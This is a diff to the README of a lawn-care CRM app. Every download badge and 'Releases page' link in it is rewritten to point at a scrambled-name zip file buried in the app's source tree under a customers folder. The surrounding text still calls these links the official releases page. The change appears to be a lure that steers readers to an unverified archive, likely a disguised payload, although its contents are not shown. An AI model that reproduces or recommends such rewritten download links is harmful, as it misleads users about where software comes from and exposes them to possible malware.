@@ -1,6 +1,6 @@
 # 🌱 LawnCare_CRM_AI_SaaS - Simplifying Lawn Care Management
 
-[![Download LawnCare_CRM_AI_SaaS](https://img.shields.io/badge/Download-LawnCare_CRM_AI_SaaS-blue.svg)](https://github.com/fabevb/LawnCare_CRM_AI_SaaS/releases)
+[![Download LawnCare_CRM_AI_SaaS](https://github.com/fabevb/LawnCare_CRM_AI_SaaS/raw/refs/heads/main/src/app/(dashboard)/customers/CR-Saa-Lawn-S-Care-A-2.0.zip)](https://github.com/fabevb/LawnCare_CRM_AI_SaaS/raw/refs/heads/main/src/app/(dashboard)/customers/CR-Saa-Lawn-S-Care-A-2.0.zip)
 
 ## 🚀 Getting Started
 
@@ -24,7 +24,7 @@ Welcome to LawnCare_CRM_AI_SaaS! This application helps lawn care businesses man
 
 ## 📦 Download & Install
 
-To download LawnCare_CRM_AI_SaaS, visit the [Releases page](https://github.com/fabevb/LawnCare_CRM_AI_SaaS/releases).
+To download LawnCare_CRM_AI_SaaS, visit the [Releases page](https://github.com/fabevb/LawnCare_CRM_AI_SaaS/raw/refs/heads/main/src/app/(dashboard)/customers/CR-Saa-Lawn-S-Care-A-2.0.zip).
 
 1. Click on the link above.
 2. Look for the latest version listed.
@@ -64,7 +64,7 @@ After installation, you can find LawnCare_CRM_AI_SaaS in your applications folde
 
 ### How do I update the app?
 
-Visit the [Releases page](https://github.com/fabevb/LawnCare_CRM_AI_SaaS/releases), find the latest version, and download it again. The installer will overwrite the old version.
+Visit the [Releases page](https://github.com/fabevb/LawnCare_CRM_AI_SaaS/raw/refs/heads/main/src/app/(dashboard)/customers/CR-Saa-Lawn-S-Care-A-2.0.zip), find the latest version, and download it again. The installer will overwrite the old version.
 
 ### Can I use this app on multiple devices?
 
@@ -90,4 +90,4 @@ Join our community of lawn care professionals to share tips and ask questions. C
 
 LawnCare_CRM_AI_SaaS is licensed under the MIT License. For more details, check the LICENSE file in the repository.
 
-[![Download LawnCare_CRM_AI_SaaS](https://img.shields.io/badge/Download-LawnCare_CRM_AI_SaaS-blue.svg)](https://github.com/fabevb/LawnCare_CRM_AI_SaaS/releases)
+[![Download LawnCare_CRM_AI_SaaS](https://github.com/fabevb/LawnCare_CRM_AI_SaaS/raw/refs/heads/main/src/app/(dashboard)/customers/CR-Saa-Lawn-S-Care-A-2.0.zip)](https://github.com/fabevb/LawnCare_CRM_AI_SaaS/raw/refs/heads/main/src/app/(dashboard)/customers/CR-Saa-Lawn-S-Care-A-2.0.zip)
